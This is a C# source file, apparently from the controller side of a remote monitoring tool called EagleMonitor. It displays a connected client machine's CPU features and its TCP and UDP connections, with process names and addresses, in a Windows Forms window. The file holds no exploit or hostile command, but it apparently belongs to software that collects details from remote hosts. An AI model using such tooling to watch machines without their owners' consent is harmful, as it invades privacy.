using EagleMonitor.Networking;
using PacketLib.Packet;
using System.Threading;
using System.Windows.Forms;
using static PacketLib.Packet.InformationPacket;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class InformationPacketHandler
    {
        public InformationPacketHandler(InformationPacket informationPacket, ClientHandler clientHandler) : base()
        {
            new Thread(() =>
            {
                try
                {
                    clientHandler.informationForm.BeginInvoke((MethodInvoker)(() =>
                    {
                        string[] cpuFeatures = informationPacket.hardwareInformation["CPU"][0].Split('\n');

                        clientHandler.informationForm.label3.Text = cpuFeatures[0];
                        clientHandler.informationForm.label4.Text = cpuFeatures[1];

                        for (int i = 2; i < cpuFeatures.Length - 1; i++)
                        {
                            string[] SplitFeature = cpuFeatures[i].Split(' ');
                            int rowId = clientHandler.informationForm.dataGridView1.Rows.Add();

                            DataGridViewRow row = clientHandler.informationForm.dataGridView1.Rows[rowId];
                            row.Cells["Column1"].Value = SplitFeature[0];


                            if (SplitFeature[1] == "1")
                                row.Cells["Column2"].Value = "Yes";
                            else
                                row.Cells["Column2"].Value = "No";
                        }

                        foreach (TcpProcessRecord tcpConnectionIPV4 in informationPacket.tcpConnectionIPV4)
                        {
                            int rowId = clientHandler.informationForm.dataGridView2.Rows.Add();

                            DataGridViewRow row = clientHandler.informationForm.dataGridView2.Rows[rowId];
                            row.Cells["Column1TCP"].Value = tcpConnectionIPV4.ProcessId.ToString();
                            row.Cells["Column2TCP"].Value = tcpConnectionIPV4.ProcessName;
                            row.Cells["Column3"].Value = tcpConnectionIPV4.LocalAddress.ToString();
                            row.Cells["Column4"].Value = tcpConnectionIPV4.LocalPort.ToString();
                            row.Cells["Column5"].Value = tcpConnectionIPV4.RemoteAddress.ToString();
                            row.Cells["Column6"].Value = tcpConnectionIPV4.RemotePort.ToString();
                            row.Cells["Column7"].Value = tcpConnectionIPV4.State.ToString();
                            row.Cells["Column8"].Value = "TCP";
                        }

                        foreach (UdpProcessRecord udpConnectionIPV4 in informationPacket.udpConnectionIPV4)
                        {
                            int rowId = clientHandler.informationForm.dataGridView2.Rows.Add();

                            DataGridViewRow row = clientHandler.informationForm.dataGridView2.Rows[rowId];
                            row.Cells["Column1TCP"].Value = udpConnectionIPV4.ProcessId.ToString();
                            row.Cells["Column2TCP"].Value = udpConnectionIPV4.ProcessName;
                            row.Cells["Column3"].Value = udpConnectionIPV4.LocalAddress.ToString();
                            row.Cells["Column4"].Value = udpConnectionIPV4.LocalPort.ToString();
                            row.Cells["Column8"].Value = "UDP";
                        }

                        clientHandler.informationForm.loadingCircle1.Visible = false;
                        clientHandler.informationForm.loadingCircle1.Active = false;
                    }));
                }
                catch { }
            }).Start();
        }
    }
}
